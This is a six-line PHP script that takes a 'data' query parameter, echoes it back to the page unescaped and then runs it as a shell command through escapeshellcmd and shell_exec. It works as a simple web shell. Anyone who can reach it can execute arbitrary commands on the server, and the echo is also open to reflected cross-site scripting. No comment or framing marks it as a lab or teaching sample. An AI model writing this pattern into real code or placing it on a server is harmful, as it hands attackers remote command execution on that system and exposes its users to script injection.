<?php
$data = $_GET['data'];
echo $data;
$command = escapeshellcmd($data);
shell_exec($command);
?>